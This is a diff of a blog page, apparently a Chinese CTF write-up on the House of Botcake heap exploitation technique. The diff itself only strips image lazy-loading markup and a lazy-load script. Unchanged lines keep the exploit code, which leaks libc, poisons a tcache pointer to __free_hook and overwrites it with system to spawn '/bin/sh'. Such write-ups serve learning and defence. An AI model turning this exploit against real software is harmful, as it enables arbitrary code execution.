@@ -141,7 +141,7 @@
         <div class="left">
             
                 <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
-                    <img src="/img/loading.gif" data-original="/images/favicon.png" class="w-full h-full rounded-sm">
+                    <img src="/images/favicon.png" class="w-full h-full rounded-sm">
                 </a>
             
             <a class="logo-title" href="/">
@@ -259,7 +259,7 @@
         
             <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                 <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/img/loading.gif" data-original="/images/avatar.jpg">
+                    <img src="/images/avatar.jpg">
                 </div>
                 <div class="info flex flex-col justify-between">
                     <div class="author flex items-center">
@@ -395,7 +395,7 @@
 <h2 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h2><p><code>1.填满tcache bin,并泄露libc</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意要先add再free，不然add就是取tcache bin中的chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112625355.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112625355.bmp"></p>
 <p>直接show就可以获得__malloc_hook+0x70的地址，达到泄露libc</p>
 <p><code>2.打House Of Botcake</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">bug()</span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># tcache留下空位</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># chunk10</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># tcahcebin unsortedbin</span></span><br></pre></td></tr></table></figure></div>
@@ -403,16 +403,16 @@
 <ul>
 <li>free(7)</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112740399.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112740399.bmp"></p>
 <ul>
 <li>add(0x80)</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112807185.bmp"></p>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112656932.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112807185.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112656932.bmp"></p>
 <ul>
 <li>free(8)进入tcache（unsorted bin先进先出)</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112828023.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017112828023.bmp"></p>
 <p><code>3.利用edit任意改+double free</code></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(__free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,size(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(system_addr)) <span class="comment"># 12</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
@@ -420,15 +420,15 @@
 <ul>
 <li>edit(7,size(payload),payload)，修改tcache bin chunk fd</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113852230.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113852230.bmp"></p>
 <ul>
 <li>第二次add之前，进行第二次add即可将__free_hook当作fake_chunk</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113915339.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113915339.bmp"></p>
 <ul>
 <li>第二次add，修改fd为system，即free -&gt; __free_hook-&gt;system，此时执行free,即执行system</li>
 </ul>
-<p><img lazyload src="/img/loading.gif" data-original="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113934742.bmp"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/House-Of-Botcake/capture_20241017113934742.bmp"></p>
 <ul>
 <li>最后free(11),即system(‘&#x2F;bin&#x2F;sh’)</li>
 </ul>
@@ -731,7 +731,7 @@
     </div>
 
     <div class="image-viewer-container">
-    /img/loading.gif" data-original="<img src="">
+    <img src="">
 </div>
 
 
@@ -858,18 +858,5 @@
 
 
 
-
-        <style>
-            [bg-lazy] {
-                background-image: none !important;
-                background-color: #eee !important;
-            }
-        </style>
-        <script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                preloadRatio: 1,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</body>
 </html>
